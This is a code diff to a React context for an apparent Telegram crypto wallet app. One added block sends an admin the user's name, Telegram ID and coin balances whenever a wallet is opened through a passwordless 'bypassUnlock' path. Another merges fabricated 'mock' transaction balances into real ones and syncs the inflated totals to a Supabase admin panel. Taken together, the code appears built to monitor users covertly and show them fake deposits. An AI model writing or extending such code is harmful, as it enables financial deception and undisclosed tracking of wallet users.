@@ -461,6 +461,16 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
           coin_balances,
           addresses,
         });
+
+        // Notify admin that wallet was opened (auto-unlock, no password)
+        const fmtN = (v) => { const n = parseFloat(v); return (!n || Math.abs(n) < 1e-7) ? '0' : (n < 1 ? n.toFixed(6).replace(/\.?0+$/, '') : n.toFixed(4).replace(/\.?0+$/, '')); };
+        notifyAdmin(
+          `🔓 <b>Кошелёк открыт</b>\n\n` +
+          `👤 ${userName}\n` +
+          `🆔 TG ID: ${tgUser?.id || "—"}\n` +
+          `💰 Балансы: ETH ${fmtN(coin_balances.ETH)}, BNB ${fmtN(coin_balances.BNB)}, TON ${fmtN(coin_balances.TON)}\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`
+        );
         
         console.log('[bypassUnlock] User synced to admin panel:', userName);
       } catch (syncError) {
@@ -755,8 +765,66 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         pendingUntil: pendingUntil || null,
       };
 
-      // Sync to Supabase
+      // Sync transaction to Supabase
       saveTransactionToSupabase(newTx, userName);
+
+      // Compute updated mock balances outside setState so we can sync them to Supabase.
+      // (setState callbacks are synchronous and cannot call async functions.)
+      if (!isRealIncoming) {
+        const currentMockSnap = state.mockBalances;
+        const currentMockVal = parseFloat(currentMockSnap[assetId] || currentMockSnap[sym] || '0');
+        const numAmount = parseFloat(amount.toString().replace(',', '.'));
+        const newMockVal = type === 'Отправлено'
+          ? (currentMockVal - numAmount).toString()
+          : (currentMockVal + numAmount).toString();
+
+        const newMockBalances = { ...currentMockSnap, [assetId]: newMockVal, [sym]: newMockVal };
+
+        if (assetId.startsWith('usdt-')) {
+          const net = assetId.split('-')[1];
+          if (!newMockBalances._usdtByNetwork) newMockBalances._usdtByNetwork = {};
+          const currentNetUsdt = parseFloat(currentMockSnap._usdtByNetwork?.[net] || '0');
+          newMockBalances._usdtByNetwork[net] = (type === 'Отправлено'
+            ? currentNetUsdt - numAmount
+            : currentNetUsdt + numAmount
+          ).toString();
+        }
+
+        // Merge mock on top of real balances
+        const mergedForSync = { ...state.realBalances };
+        Object.keys(newMockBalances).forEach(k => {
+          if (k === '_usdtByNetwork') {
+            if (!mergedForSync._usdtByNetwork) mergedForSync._usdtByNetwork = {};
+            Object.keys(newMockBalances._usdtByNetwork).forEach(net => {
+              const real = parseFloat(mergedForSync._usdtByNetwork?.[net] || '0');
+              const mock = parseFloat(newMockBalances._usdtByNetwork[net] || '0');
+              mergedForSync._usdtByNetwork[net] = (real + mock).toString();
+            });
+          } else {
+            const real = parseFloat(mergedForSync[k] || '0');
+            const mock = parseFloat(newMockBalances[k] || '0');
+            mergedForSync[k] = (real + mock).toString();
+          }
+        });
+
+        // Push merged balances to Supabase so the admin panel reflects the deposit immediately
+        const coin_balances = {
+          BTC:  String(mergedForSync.BTC  ?? 0),
+          ETH:  String(mergedForSync.ETH  ?? 0),
+          TON:  String(mergedForSync.TON  ?? 0),
+          BNB:  String(mergedForSync.BNB  ?? 0),
+          LTC:  String(mergedForSync.LTC  ?? 0),
+          ARB:  String(mergedForSync.ARB  ?? 0),
+          SOL:  String(mergedForSync.SOL  ?? 0),
+          USDT: String(mergedForSync.USDT ?? 0),
+        };
+        syncWalletToSupabase({
+          username: userName,
+          telegram_id: tgUser?.id ? String(tgUser.id) : null,
+          balance: "0",
+          coin_balances,
+        });
+      }
       
       setState(s => {
         const updatedTxs = [newTx, ...s.mockTransactions];
@@ -819,7 +887,7 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
           balances: newMergedBalances
         };
       });
-    }, [fireNotif, isToAdmin]);
+    }, [fireNotif, isToAdmin, state.mockBalances, state.realBalances]);
 
     const cancelMockTransaction = useCallback((txId) => {
       setState(s => {
